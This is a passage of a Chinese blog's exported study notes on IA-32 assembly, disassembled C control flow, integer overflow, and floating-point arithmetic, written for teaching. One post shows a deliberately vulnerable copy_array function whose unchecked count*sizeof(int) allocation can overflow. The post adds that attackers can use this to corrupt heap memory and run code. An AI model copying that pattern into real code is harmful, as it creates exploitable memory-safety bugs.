在vs2015执行中出现了报错Run-Time Check Failure #2 - Stack around the variable ‘a’ was corrupted.原因在于如果i超出了范围，数组中的数据会破坏栈里面的数据。 1234567891011121314151617181920212223242526double fun(int i)&#123;01161710 push ebp 01161711 mov ebp,esp 01161713 sub esp,0E0h 01161719 push ebx 0116171A push esi 0116171B push edi 0116171C lea edi,[ebp-0E0h] 01161722 mov ecx,38h 01161727 mov eax,0CCCCCCCCh 0116172C rep stos dword ptr es:[edi] volatile double d[1] = &#123; 3.14 &#125;;0116172E movsd xmm0,mmword ptr [__real@40091eb851eb851f (01166B38h)] 01161736 movsd mmword ptr [d],xmm0 volatile long int a[2]; a[i] = 1073741824;0116173B mov eax,dword ptr [i] volatile long int a[2]; a[i] = 1073741824;//400000000h0116173E mov dword ptr a[eax*4],40000000h return d[0];01161746 mov eax,8 0116174B imul ecx,eax,0 0116174E fld qword ptr d[ecx] &#125; 选择和循环结构1234if(cond_expr) then_statementelse else_statement 机器级表示 12345678 c = cond_expr; if(!c) goto false_label; then_statement goto done;false_label: else_statementdone: 例子： 123456789101112131415161718192021222324252627282930313233343536int get_cont(int *p1, int *p2)&#123;00831790 push ebp 00831791 mov ebp,esp 00831793 sub esp,0C0h 00831799 push ebx 0083179A push esi 0083179B push edi 0083179C lea edi,[ebp-0C0h] 008317A2 mov ecx,30h 008317A7 mov eax,0CCCCCCCCh 008317AC rep stos dword ptr es:[edi] if (p1 &gt; p2)008317AE mov eax,dword ptr [p1] 008317B1 cmp eax,dword ptr [p2] //比较008317B4 jbe get_cont+2Fh (08317BFh) &#123; return *p2;008317B6 mov eax,dword ptr [p2] 008317B9 mov eax,dword ptr [eax] 008317BB jmp get_cont+34h (08317C4h) &#125; else008317BD jmp get_cont+34h (08317C4h) //这条指令看上去执行不到啊 &#123; return *p1;008317BF mov eax,dword ptr [p1] 008317C2 mov eax,dword ptr [eax] &#125;&#125;008317C4 pop edi 008317C5 pop esi 008317C6 pop ebx 008317C7 mov esp,ebp 008317C9 pop ebp 008317CA ret 关于switch语句 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int sw_test(int a,int b,int c)&#123;00A11810 push ebp 00A11811 mov ebp,esp 00A11813 sub esp,0D0h 00A11819 push ebx 00A1181A push esi 00A1181B push edi 00A1181C lea edi,[ebp-0D0h] 00A11822 mov ecx,34h 00A11827 mov eax,0CCCCCCCCh 00A1182C rep stos dword ptr es:[edi] int result; switch (a)00A1182E mov eax,dword ptr [a] //参数a00A11831 mov dword ptr [ebp-0D0h],eax 00A11837 mov ecx,dword ptr [ebp-0D0h] 00A1183D sub ecx,0Ah //i=i-10 int result; switch (a)00A11840 mov dword ptr [ebp-0D0h],ecx 00A11846 cmp dword ptr [ebp-0D0h],7 //i与7比较00A1184D ja $LN6+0Bh (0A1187Bh) //&gt;7则跳转到输出default00A1184F mov edx,dword ptr [ebp-0D0h] //edx=i00A11855 jmp dword ptr [edx*4+0A1188Ch] //跳到跳转表的位置 &#123; case 15: c = b &amp; 0x0f;00A1185C mov eax,dword ptr [b] 00A1185F and eax,0Fh 00A11862 mov dword ptr [c],eax case 10: result = c + 50;00A11865 mov eax,dword ptr [c] 00A11868 add eax,32h 00A1186B mov dword ptr [result],eax break;00A1186E jmp $LN6+11h (0A11881h) case 12: case 17: result = b + 50;00A11870 mov eax,dword ptr [b] 00A11873 add eax,32h 00A11876 mov dword ptr [result],eax break;00A11879 jmp $LN6+11h (0A11881h) default: result = a;00A1187B mov eax,dword ptr [a] 00A1187E mov dword ptr [result],eax &#125; return result;00A11881 mov eax,dword ptr [result] &#125;00A11884 pop edi &#125;00A11885 pop esi 00A11886 pop ebx 00A11887 mov esp,ebp 00A11889 pop ebp 00A1188A ret 00A1188B nop 00A1188C sbb byte ptr gs:[ecx-5EE78500h],ah 00A11893 add byte ptr [eax+18h],dh 00A11896 mov eax,dword ptr ds:[A1187B00h] 00A1189B add byte ptr [ebx+18h],bh 00A1189E mov eax,dword ptr ds:[A1185C00h] 00A118A3 add byte ptr [ebx+18h],bh 00A118A6 mov eax,dword ptr ds:[A1187000h] 00A118AB add ah,cl","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"IA-32指令类型（2）","slug":"2017-05-13-IA-32指令类型2","date":"2017-05-12T16:00:00.000Z","updated":"2018-02-18T03:29:06.537Z","comments":true,"path":"2017/05/13/2017-05-13-IA-32指令类型2/","link":"","permalink":"http://coordinate.wang/2017/05/13/2017-05-13-IA-32指令类型2/","excerpt":"","text":"控制转移指令指令执行可按顺序或跳转到转移目标指令处执行无条件转移指令JMP DST：无条件转移到目标指令DST处执行条件转移指令Jcc DST：cc为条件码，根据标志判断是否满足条件，若条件满足，则转移到目标指令DST处执行，否则按顺序执行条件设置SET cc DST ：按条件码cc判断的结果保存到 DST（8位寄存器）调用和返回指令CALL DST：返回地址RA入栈，转DST处执行RET：从栈中取出返回地址RA，转到RA中断指令 123456789int sum(int a[],unsigned len)&#123; int i,sum = 0; for(i =0; i &lt;= len-1; ++i) &#123; sum += a[i]; &#125; return sum;&#125; 当参数len为0时，返回值应该是0，但是在机器上执行时，却发生了存储器访问异常。原因在于len是一个无符号数，len-1得到的是32个1所以，循环时会无限循环，所以这里再次告诉我们尽量不要使用unsigned。 X87浮点处理指令 IA-32中处理的浮点数类型有三种：float（32位IEEE 754）、double（64位IEEE 754）、long double（80位双精度扩展格式）1位符号位s、15位阶码e（偏致常数16383）、1位显示首位有效位j和63位尾数f。它与IEEE 754单精度和双精度浮点格式的一个重要区别是：他没有隐藏位，有效位共64位。 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;double f(int x)&#123; return 1.0/x;&#125;void main()&#123; double a,b; int i; a = f(10); b = f(10); i = a== b; printf(\"%d\\n\", i);&#125;#include &lt;stdio.h&gt;double f(int x)&#123; return 1.0/x;&#125;void main()&#123; double a,b,c; int i; a = f(10); b = f(10); c = f(10); i = a== b; printf(\"%d\\n\", i);&#125; 在早期的gcc编译器中，程序一结果0，程序二结果1，原因在于对于数据结果存储时有数据丢失。 123456789#include &lt;stdafx.h&gt;int main()&#123; int a = 10; double*p = (double *)&amp;a; printf(\"%f\\n\", *p);//0.000000 printf(\"%f\\n\", (double)a);//10.000000 return 0;&#125; 前后两次打印结果不一样，原因在于后面一种做法是使用了转换指令先把int转为double，而第一个没有。 123456789101112131415 printf(&quot;%f\\n&quot;, *p);//0.00000000FB1795 mov eax,dword ptr [p] 00FB1798 sub esp,8 00FB179B movsd xmm0,mmword ptr [eax] 00FB179F movsd mmword ptr [esp],xmm0 00FB17A4 push offset string &quot;%f\\n&quot; (0FB6B30h) 00FB17A9 call _printf (0FB1316h) 00FB17AE add esp,0Ch printf(&quot;%f\\n&quot;, (double)a);//10.00000000FB17B1 cvtsi2sd xmm0,dword ptr [a] 00FB17B6 sub esp,8 00FB17B9 movsd mmword ptr [esp],xmm0 00FB17BE push offset string &quot;%f\\n&quot; (0FB6B30h) 00FB17C3 call _printf (0FB1316h) 00FB17C8 add esp,0Ch 从汇编我们可以看到第二个打印函数中出现了一个cvsi2sd，而这个指令就是用于将双字整数转换成标量双精度浮点值 MMX及SSE指令MMX指令使用8个64位寄存器MM0~MM7，借用8个80位寄存器ST(0)~ST(7)中的64位尾数所占的位，可同时处理8个字节，或4个字，或2个双字，或一个64位数据，是一种SIMD技术。SSE是在MMX基础上提出来的。单指令多数据技术。SSE指令集价格80位浮点寄存器扩充到128位多媒体扩展通用寄存器XMM0~XMM7，可同时处理16个字节，或8个字，或4个双字，或两个字节的数据。","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"IA-32指令类型（1）","slug":"2017-05-12-IA-32指令类型1","date":"2017-05-11T16:00:00.000Z","updated":"2018-02-18T03:29:06.522Z","comments":true,"path":"2017/05/12/2017-05-12-IA-32指令类型1/","link":"","permalink":"http://coordinate.wang/2017/05/12/2017-05-12-IA-32指令类型1/","excerpt":"","text":"传送指令通用数据传送指令MOV：一般传送，包括movb、movw、movlMOVS：符号传送，如movsbw、movswlMOVZ：零扩展传送，如movzwl、movzblXCHG：数据交换PUSH/POP：入栈出栈，如pushl、pushw、popl、popw入栈sp-，出栈sp+ 地址传送指令LEA：加载有效地址，如leal (%edx,%eax),%eax的功能为R[eax]&lt;-R[edx]+R[eax]，执行前，若R[edx]=i,R[eax]=j，则执行指令后，R[eax]=i+j 输入输出指令IN和OUT：I/O端口与寄存器之间的交换 标志传送指令PUSHF、POPF：将EFLAG压栈，或将栈顶内容送EFLAG 定点算术运算指令加减运算指令（影响标志、不区分无/带符号）ADD：加，包括addb、addw、addlSUB：减，包括subb、subw、subl假设R[ax]=fffah，R[bx]=fff0h，则执行指令后“addw %bx,%ax”R[ax]=fffah+fff0h=ffeah，bx中内容不变CF=1，OF=0，ZF=0，SF=1若是无符号数运算，则CF=1说明结果溢出若是带符号整数运算，则OF=0说明结果没有溢出 增1/减1运算（影响除CF以外的标志、不区分无/带符号）INC：加，包括incb、incw、inclDEC：减，包括decb、decw、decl 取负运算（影响标志、若对0取负、则结果为0且CF清0，否则CF置1）NEG：取负，包括negb、negw、negl 比较运算（做减法得到标志、不区分无/带符号）CMP：比较，包括cmpb、cmpw、cmpl 乘/除运算（不影响标志、区分无/带符号）MUL/IMUL：无符号乘/带符号乘DIV/IDIV：无符号乘/带符号乘乘法指令：可以给出一个、两个或三个操作数若给出一个操作数SRC，则另一个源操作数隐含在AL/AX/EAX中，将SRC和累加器内容相乘，结果存放在AX或DX-AX或EDX-EAX中。DX-AX表示32位乘积的高、低位分别在DX和AX中。nn=2n若指令中给出两个操作数DST和SRC，则将DST和SRC相乘，结果在DST中。nn=n若指令给出三个操作数REG、SRC、IMM，则将SRC和立即数IMM相乘，结果在REG中。nn=n除法指令：只明显指出除数，用EDX-EAX中内容除以指定的除数若为8位，则16位被除数在AX寄存器中，商送回AL，余数在AH若为16位，则32位被除数在DX-AX寄存器中，商送回AX，余数在DX若为32，则被除数在EDX-EAX寄存器中，商送EAX，余数在EDX假设R[eax]=000000b4h，R[ebx]=00000011h，M[000000f8h]=000000a0h，执行下面指令mulb %bl功能为$$R[ax]&lt;-R[al]R[bl]$$，执行结果 $$R[ax]=b4h11h=0bf4h$$(无符号整数180和17相乘)$$R[ax]=b4h11h=faf4h$$(带符号整数-76和17相乘)对于带符号数乘，若乘积只取低n位，则和无符号数相同；若取2n位，则采用布斯乘法。执行$$imull -16,(\\%eax,\\%ebx,4),\\%eax$$功能为$$R[eax]&lt;-(-16)M[R[eax]+R[ebx]4]$$，执行结果为$$R[eax]+R[ebx]4=000000b4h+00000011h&lt;&lt;2=000000f8h$$$$R[eax]=-16M[000000f8h]=16*(-000000a0h)=ffffff60h&lt;&lt;4=fffff600h$$ 按位运算指令逻辑运算NOT：非，包括notb、notw、notlAND：与，包括andb、andw、andlOR：或，包括orb、orw、orlXOR：异或，包括xorb、xorw、xorlTEST：做“与”操作测试，仅影响标志只有not指令不影响标志，其他指令OF=CF=0，而ZF和SF则根据结果设置：若全0，则ZF=1；若最高位为1，则SF=1假设M[0x1000]=00000f89h,M[0x1004]=000001270h,R[eax]=ff000001h,R[ecx]=00001000h 123notw %ax R[ax]=fffeh; andl %eax,(%ecx)=00000f89h^ff000001h=00000001h orb 4(%ecx),%al=70h | 01h=71h 移位运算（左/右移时，最高/最低位送CF）SHL/SHR：逻辑左/右移，包括shlb，shrw，shrlSAL/SAR：算数左/右移，左移要判断溢出，右移高位补符号（移位前、后符号位发生变化，则OF=1）包括salb、sarw、sarlROL/ROR：循环左/右移，包括rolb、rorw、rollRCL/RCR：带进位循环左/右移，即：将CF作为操作数一部分循环移位，包括rclb、rcrw、rcll假设short型变量x被编译器分配在寄存器AX中，R[ax]=ff80h,则以下汇编代码执行后变量x的机器数和真值 1234movw %ax,%dx R[dx]&lt;-R[ax] salw $2,%ax 1111 1111 1000 0000&lt;&lt;2 addl %dx,%ax 1111 1110 0000 0000 +1111 1111 1000 0000 sarw $1,%ax 1111 1101 1000 0000&gt;&gt;1=1111 1110 1100 0000 \\$2与\\$1表示立即数2和1。","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"IA-32指令系统概述","slug":"2017-05-11-IA-32指令系统概述","date":"2017-05-10T16:00:00.000Z","updated":"2018-02-18T03:29:06.504Z","comments":true,"path":"2017/05/11/2017-05-11-IA-32指令系统概述/","link":"","permalink":"http://coordinate.wang/2017/05/11/2017-05-11-IA-32指令系统概述/","excerpt":"","text":"程序转换概述指令的概念计算机中的指令有微指令、机器指令和伪指令机器指令处于硬件和软件的交界面，相当于一个菜谱指定的一个完整做菜过程微指令是微程序命令，属于硬件范畴，相当于洗，切煮等过程伪指令是由若干机器指令组成的指令序列，属于软件范畴，相当于由多个菜谱合成一个大菜的过程汇编指令是机器指令的汇编表示形式，即符号表示。机器指令与汇编指令一一对应，它们都与机器结构有关，都属于机器级指令。 IA-32指令系统概述IA-32的寄存器组织EAX累加器000EBX基址寄存器011ECX计数寄存器001EDX数据寄存器010ESP堆栈指针100EBP基址指针101ESI源变址寄存器110EDI目标变址寄存器111EIP指令指针EFLAGS标志寄存器CS代码段SS堆栈段DS数据段ES附加段FS附加段GS附加段 IA-32的标志寄存器6个条件标志零标志ZF、溢出标志OF、进借位标志CF、符号标志SF、辅助进位标志AF（BCD码运算时才有意义）、奇偶标志PF3个控制标志DF：方向标志（自动变址方向是增还是减）IF：中断允许标志（仅对外部可屏蔽中断有用）TF：陷阱标志（是否是单步跟踪状态） IA-32的寻址方式寻址方式：如何根据指令给定信息得到操作数或操作数的地址操作数所在的位置: 指令中：立即寻址 寄存器中：寄存器寻址 存储单元中（属于存储器操作数，按字节编址）：其他寻址方式 存储器操作数的寻址方式与微处理器的工作模式有关： 实地址模式（基本用不到）为与8086/8088兼容设置，加电或复位时，寻址空间1MB，20位地址：(CS) &lt;&lt; 4 + (IP) 保护模式（需要掌握）加电后进入，采用虚拟存储管理，多任务情况下隔离、保护，80286以上微处理器的工作方式，寻址空间2^32B，32位线性寻址分段（段基址+段内偏移量） 存储器操作数的寻址方式在linux系统中：double型变量按4B边界对齐在windows系统中：double型变量按8B边界对齐 123float a[100];short b[4][4];double d[10]; a[i]的地址计算：$$104+i4$$，位移+比例变址b[i][j]的地址计算：$$504+i8+j2(42 = 8)$$，位移+基址+比例变址d[i]的地址计算：$$544+i8$$，位移+比例变址将b[i][j]取到AX中的指令可以是：movew 504(%ebp, %esi), %ax，其中i8在EBP中，j在ESI中，2为比例因子 IA-32机器指令格式 操作码 寻址方式 SIB 位移 直接数据 1或2 0或1 0或1 1、2、4 立即数 寻址方式 Mod Reg/OP R/M (6~7) (3~5) (0~2) SIB SS Index Base (6~7) (3~5) (0~2) 位移量和立即数都可以是：1B/2B/4BSIB中的基址B和变址I都可以是8个GRS中任一个：SS给出比例因子(00 01 10 11)操作码：opcode；W：与机器模式（16/32位）一起确定寄存器位数（AL/AX/EAX）；D：操作方向（确定源和目标）寻址方式：mod、r/m、reg/op三个字段与w字段和机器模式(16/32)一起确定操作数所在的寄存器编号或有效地址计算方式例如： 1231000 1101 0000 0100 0000 00108d 04 02 leal (%edx,%eax,1),%eax1:SS eax:Index edx:Base eax:Reg/OP","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"乘除运算及浮点数运算（2）","slug":"2017-05-09-乘除运算及浮点数运算2","date":"2017-05-08T16:00:00.000Z","updated":"2018-02-18T03:29:06.484Z","comments":true,"path":"2017/05/09/2017-05-09-乘除运算及浮点数运算2/","link":"","permalink":"http://coordinate.wang/2017/05/09/2017-05-09-乘除运算及浮点数运算2/","excerpt":"","text":"浮点数运算浮点数运算及结果设置两个规格化的浮点数分别为$$A=M_a2^{Ea} B=M_b2^{Eb}$$,则：$$A+B=(M_a+M_b2^{(-(Ea-Eb))2^{Ea})}(假设Ea&gt;=Eb)$$$$AB=(M_aM_b) 2^{(Ea+Eb)}$$$$A / B =(M_a/M_b)2^{(Ea-Eb)}$$会出现下面这种情况：阶码溢出：一个正指数超过了最大允许值，一个负指数超过了最小允许值。最高有效位有进位，出现尾数溢出（右归）。数值部分高位为0，出现非规格化尾数（左归）。右归或对阶时，右归有效位丢失，运算过程中允许添加有效位。IEEE建议实现时为每种情况提供有一个自陷允许位。若某异常对应的位为1，则发生相应异常时，就调用一个特定的异常处理程序。 对于浮点数除以0的问题 12345678910111213141516#include &lt;conio.h&gt;#include &lt;stdio.h&gt;int main()&#123; int a = 1, b = 0; printf(\"Division by zero:%d\\n\", a/b); getchar(); return 0;&#125;int main()&#123; double x = 1,y = -1,z = 0.0; printf(\"division by zero:%f %f\\n\", x/z, y/z); getchar(); return 0;&#125; 对于第一个函数出现异常，第二个结果是1.#INF00和-1.#INF00。因为浮点数可以表示无穷大，而整数不可以。浮点数加减运算计算$$1.12310^5+2.5610^2 $$过程如下：$$1.12310^5+2.5610^2 = 1.12310^5+0.0025610^5 = 1.12565610^5 = 1.12610^5 $$其中56是附加位，最后考虑，计算位数加减法前，必须对阶，最后考虑舍入。对阶操作，目的是使两数的阶数相同。小阶向大阶看齐，阶小的那个数的尾数右移。IEEE 754尾数右移时，要将隐含的“1”移到小数部分，高位补0，移出的低位保留到特定的“附加位”上。用二进制浮点数计算0.5+(-0.4375) = ?$$0.5 = 1.0002^{(-1)}，-0.4375 = -0.1112^{(-1)} $$$$1.0002^{(-1)}+(-0.1112^{(-1)}) = 0.001*2^{(-1)}$$为何IEEE 754加减运算右归时最多只需要一次。因为即使是两个最大的尾数相加，得到的和的尾数也不会达到4，故尾数的整数部分最多有两位，保留一个隐含的“1”后，最多只有一位被右移到小数部分。 Extra bitsIEEE 754规定：中间结果必须在右边加两个附加位（guard &amp; round），guard（保护位）在significand右边的位，round（舍入位）在保护位右边的位。附加位的作用：用以保护对阶时右移的位或运算的中间结果。附加位的处理：左归时被移到significand中，作为舍入的依据。IEEE 754舍入方式就近舍入(default)：舍入为最近可表示的数。非中间值：0舍1入；中间值：强迫结果为偶数例如：1.110111-&gt; 1.1110; 1.110101-&gt;1.1101；1.110110-&gt;1.111001舍11入10强迫结果为偶数 12345678910#include &lt;stdio.h&gt;main()&#123; float a; double b; a = 123456.789e4; b = 123456.789e4; printf(\"%f/n%f/n\", a,b);//1234567936.000000 1234567890.000000&#125; float可以表示的7个十进制有效位，后面的数位是舍入后的结果，舍入后的结果可能会更大，也可能更小。float和double是IEEE 754的标准，和处理器、编译器没有关系。而long double类型的长度和格式随编译器和处理器类型的不同而有所不同。从int到float不会发生溢出，但可能数据被舍入。要注意的是浮点数不满足结合了率，原因是由于精度问题，会出现大数吃小数的问题。","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"乘除运算及浮点数运算（1）","slug":"2017-05-08-乘除运算及浮点数运算1","date":"2017-05-07T16:00:00.000Z","updated":"2018-02-18T03:29:06.468Z","comments":true,"path":"2017/05/08/2017-05-08-乘除运算及浮点数运算1/","link":"","permalink":"http://coordinate.wang/2017/05/08/2017-05-08-乘除运算及浮点数运算1/","excerpt":"","text":"整数的乘法运算整数的乘法运算通常，高级语言中两个n位整数相乘得到的结果通常也是一个n位整数，也即结果只取2n位乘积中的低n位。在计算机内部，一定有$$x^2&gt;=0$$吗？若x是带符号整数，则不一定；若x为浮点数，则不一定。原因就是只取低n位元素。如何判断返回的值z是正确的值？当$$!x || z/x==y$$为真编译器是如何判断结果是不是真确的？当$$-2^{(n-1)}≤x*y≤2^{(n-1)}$$（不溢出），即乘积的高n位为全0或全1，并等于低n位的最高位。即乘积的高n+1位全0或全1若x和y都是unsigned类型，则判断方式是乘积的高n位全0，则不溢出。要注意的是硬件不判断溢出，所以如果程序不采用防止溢出的措施，且编译器也不生成用于溢出处理的代码，就会发生一些由于整数溢出而带来的问题。 整数乘法溢出漏洞123456789101112int copy_array(int *array,int count)&#123; int i; int *myarray = (int*) malloc(count*sizeof(int)); if(myarray == NULL) return -1; for(i = 0; i &lt; count; ++i) &#123; myarray[i] = array[i]; &#125; return count;&#125; 如果count很大的时候，如$$count=2^{32}+1$$时，count*sizeof(int)=4.攻击者可以构造特殊参数来触发整数溢出，以一段预设信息覆盖一个已分配的对缓冲区，造成远程服务器崩溃或者改变内存数据并执行任意代码。 变量与常数之间的乘运算编译器在处理变量与常数相乘时，往往以移位、加法、和减法的组合运算来代替乘法运算。因为乘法运算就是重复的加若干次实现的，所以非常耗时间。例如，对于表达式$$x20$$，编译器可以利用$$20=16+4=2^4+2^2$$，将$x20$转换为$$(x&lt;&lt;4)+(x&lt;&lt;2)$$，这样，一次乘法转换成了两次移位和一次加法。不管是无符号数还是带符号数得乘法，即使乘积溢出时，利用移位和加减运算组合的方式得到的结果都是和采用直接项城的结果是一样的。 整数的除法运算整数的除法运算对于带符号整数来说，n位整数除以n位整数，除$$-2^{(n-1)}/(-1)=2^{(n-1)}$$会发生溢出外，其他情况不会发生。因为$$2^{(n-1)}$$无法表示。因为整数除法，其商也是整数，所以，再不能整除的时候需要进行舍入，通常按照朝0方向舍入，即正数商取比自身小的最接近整数，负数商取比自身大的最接近整数。整除0的结果无法使用一个、机器数表示。整数除法时，除数不能为0，否则会发生异常，此时，需要调出操作系统中的异常处理程序。代码段一： 123int a = 0x80000000;int b = a/-1;printf(\"%d\\n\", b);//-2147483648 原因在于编译器对于除-1优化为neg代码段二： 1234int a = 0x80000000;int b = 0;int c = a/b;printf(\"%d\\n\", b);//floating point execption 变量与常数之间的除运算除法运算是非常耗时间的，所以最好少使用除法运算。为了缩短除法运算的时间，编译器在处理一个变量与一个2的幂次形式的整数相除时，常采用右移运算实现。无符号数：逻辑右移带符号数：算术右移能整除时，直接右移得到结果，移出的全为0；不能整除时，右移移除的位中有非0，需要进行相应处理。例如：$$12/4 = 3:0000 1100&gt;&gt;2=0000 0011$$不能整除时，采用朝0舍入，即截断的方式。无符号数、带符号正整数，移出的低位直接丢弃。带符号负整数，加偏移量$$（2^k-1）$$，然后在右移k位，低位截断（这里k是右移位数）例如：无符号数 $$14/4=3:0000 1110&gt;&gt;2 = 0000 0011$$带符号负整数$$ -14/4=(-14+2^2-1)/4=(1111 0010+0000 0011)&gt;&gt;2=1111 0101&gt;&gt;2=1111 1101$$ 12345int div32(int x)&#123; int b = (x &gt;&gt; 31)&amp;0x1f;//偏移量 return (x+b) &gt;&gt; 5;&#125;","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"运算电路基础（2）","slug":"2017-05-07-运算电路基础2","date":"2017-05-06T16:00:00.000Z","updated":"2018-02-18T03:29:06.437Z","comments":true,"path":"2017/05/07/2017-05-07-运算电路基础2/","link":"","permalink":"http://coordinate.wang/2017/05/07/2017-05-07-运算电路基础2/","excerpt":"","text":"C语言中的各类计算C语言中涉及的运算从运算符无法区分逻辑移位和算数移位，由数的类型决定。如果是无符号数，那么是逻辑左（右）移。具体规则是：高（低）位移出，低（高）位补0，左移可能溢出。如果左移时高位是1，就发生溢出。如果是带符号数，那么是算数左（右）移。具体规则如下：左移，高位移出，低位补0，可能发生溢出。如果移出的位不等于新的符号位，则发生溢出。右移，低位移出，高位补符，可能发生有效数据丢失。位扩展和位截断运算，没有专门操作运算符，根据类型转换前、后数据长短确定是扩展还是截断。扩展就是短转长，无符号数（前面补0），带符号数（前面补符号）。截断就是长转短，可能发生溢出。例子： 1234short si = -32768;unsigned short usi = si;int i = si;unsigned ui = usi; 分析结果si = -32768 8000usi = 32768 8000i = -32768 ffff 8000ui = 32768 0000 8000溢出的例子：int i = 32768short si = (short) i;int j = si;最后的结果是i与j不相等，j=-32768，原因是对i截断时发生溢出，超出了16位带符号数能表示的最大值。 条件标志位零标志ZF、溢出标志OF、进借位标志CF、符号标志SF称为条件标志。条件标志在运算电路中产生，被记录到专门的寄存器中。存放标志的寄存器通常称为程序/状态寄存器或标志寄存器。每个标志对应标志寄存器的一个标志位。OF：若a与b同号但与sum不同，则1，否则0；C_n⊕C_(n-1)SF：sum最高位ZF：如sum为0，则1，否则0CF：cout⊕sub例子：若n=8，计算107+46=?107 0110 101146 0010 1110溢出标志OF=1、零标志ZF=0、符号标志SF=1、进位标志CF=0作为无符号数运算的结果是未发生溢出，看CF作为带符号数运算的结果是发生溢出，看OF做减法用来比较大小，规则：无符号数：CF=0时，大于带符号数：OF=SF时，大于例子： 12345678unsigned int x = 134;unsigned int y = 246;int m = x;int n = y;unsigned int z1 = x-y;unsigned int z2 = x+y;int k1 = m-n;int k2 = m+n; x和m的机器码是一样的1000 0110，y和n的机器数一样1111 0110，z1和k1的机器数是一样的1001 0000，CF=1，OF=0，SF=1，z2和k2的机器数是一样的0111 1100，CF=1，OF=1，SF=0z1的值是144，是错误的值。k1的值是-112z2的值是124，是错误的值。k2的值是124，也是错误的值。 判断溢出的程序对于无符号数发生溢出时，一定满足result&lt;x and result&gt;y,否则，若$$x+y-2^n&gt;=x$$，则$y&gt;=2^n$，显然是错误的。 123456789int uadd_ok(unsigned x,unsigned y)&#123; unsigned sum = x + y; return sum &gt;= x;&#125;int usub_ok(unsigned x,unsigned y)&#123; return uadd_ok(x,-y);&#125; 对与带符号数带符号数的溢出包括正溢出和负溢出 1234567891011int tadd_ok(int x,int y)&#123; int sum = x + y; int neg_over = x&lt;0 &amp;&amp; y&lt;0 &amp;&amp; sum&gt;=0;//负溢出 int pos_over = x&gt;=0 &amp;&amp; y&gt;=0 &amp;&amp; xum&lt;0;//正溢出 return !neg_over &amp;&amp; !pos_over;&#125;int tsub_ok(int x,int y)&#123; return tadd_ok(x,-y);&#125; 当x=0，y=0x80000000时，判断减法函数是错误的","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"运算电路基础（1）","slug":"2017-05-06-运算电路基础1","date":"2017-05-05T16:00:00.000Z","updated":"2018-02-18T03:29:06.421Z","comments":true,"path":"2017/05/06/2017-05-06-运算电路基础1/","link":"","permalink":"http://coordinate.wang/2017/05/06/2017-05-06-运算电路基础1/","excerpt":"","text":"数字逻辑电路基础组合逻辑部件根据电路是否具有存储功能，将逻辑电路划分为两种类型组合逻辑电路：没有存储功能，其输出仅依赖于输入时序逻辑电路：具有存储功能，其输出不仅依赖于当前输入，还依赖于存储单元的当前状态 多路选择器K路选择器应该有k路输入，因而控制端S的位数应该是$log_2 K$ 一位加法器一位加法器称为全加器。两个加数A和B，低位进位为cin和为F,向高位的位为cout化简后逻辑表达式为F = A⊕B⊕cincout = A•B + A•cin + B•cin n位带符号数加法器程序中经常比较大小，通过做减法得到的标识信息实现 溢出标志OF:OF = C_n⊕C_(n-1)符号标志SF:SF = F_(n-1)0标志ZF=1当且仅当F=0；进位借位标志CF:CF = cout⊕cin 算数逻辑单元进行基本的算术运算和逻辑运算：无符号整数加减、带符号整数加减、与或非异或等逻辑运算核心电路是带标志加法器有一个操作控制端（ALUop），用来决定ALU所执行的处理功能。ALUop的位数k决定了操作的种类，例如，当位数k为3时，ALU最多只有2^3=8种操作。 ALUop Result ALUop Result ALUop Result ALUop Result 000 a+b 010 a&amp;b 100 ~a 110 a 001 a-b 011 a|b 101 a⊕b 未用 好用的md表格轮子 从c表达式到逻辑电路从c表达式到运算类指令基本数据类型：无符号数（二进制）、带符号整数（补码）、浮点数（IEEE 754）、字符串（ASCII）基本算术运算符中的算术运算符在底层都是减法实现。对于c赋值语句y = (x&gt;&gt;2)+k;是通过转换为指令序列，通过执行运算类指令实现。 12sarw $2,%ax;//将操作数“2”和“R[ax]”送移位器运算addw %bx,%ax;//将R[ax]和R[bx]送整数加减运算器中运算 